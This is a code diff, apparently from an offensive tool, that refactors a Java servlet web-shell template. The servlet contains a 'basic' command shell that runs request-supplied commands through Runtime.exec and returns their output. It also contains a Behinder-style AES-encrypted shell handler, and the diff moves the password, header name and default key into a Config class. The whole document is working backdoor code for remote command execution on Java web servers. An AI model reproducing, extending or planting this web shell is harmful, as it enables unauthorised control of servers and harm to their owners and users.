@@ -16,36 +16,20 @@ import java.util.Scanner;
 
 public class DynamicServletTemplate extends HttpServlet {
 
-    private String basicCmdShellPwd;
-    private String behinderShellHeader;
     private Class myClassLoaderClazz;
 
     public DynamicServletTemplate(){
         super();
-        this.basicCmdShellPwd = "pass";
-        this.behinderShellHeader = "X-Options-Ai";
-        initialize();
-    }
-
-    public DynamicServletTemplate(String password, String header){
-        super();
-        this.basicCmdShellPwd = (password != null) ? password : "pass";
-        this.behinderShellHeader = (header != null) ? header : "X-Options-Ai";
         initialize();
     }
 
     @Override
     protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
-        doGet(request, response);
-    }
-
-    @Override
-    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
         System.out.println("[+] Dynamic Servlet says hello");
 
         if(request.getParameter("type") != null && request.getParameter("type").equals("basic")){
             //basic cmd shell
-            String cmd = request.getParameter(basicCmdShellPwd);
+            String cmd = request.getParameter(Config.getPassword());
             if(cmd != null && !cmd.isEmpty()){
                 String[] cmds = null;
                 if(File.separator.equals("/")){
@@ -56,11 +40,11 @@ public class DynamicServletTemplate extends HttpServlet {
                 String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
                 response.getWriter().println(result);
             }
-        }else if(request.getHeader(behinderShellHeader) != null){
+        }else if(request.getHeader(Config.getHeader()) != null){
             //behind3 shell
             try{
                 if (request.getMethod().equals("POST")){
-                    String k="e45e329feb5d925b";/*rebeyond*/
+                    String k = Config.getBehinderShellPwdPwd();
                     request.getSession().setAttribute("u",k);
                     Cipher cipher = Cipher.getInstance("AES");
                     cipher.init(2, new SecretKeySpec((request.getSession().getAttribute("u") + "").getBytes(), "AES"));
@@ -74,6 +58,11 @@ public class DynamicServletTemplate extends HttpServlet {
                 e.printStackTrace();
             }
         }
+    }
+
+    @Override
+    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
+        doPost(request, response);
     }
 
     private void initialize(){
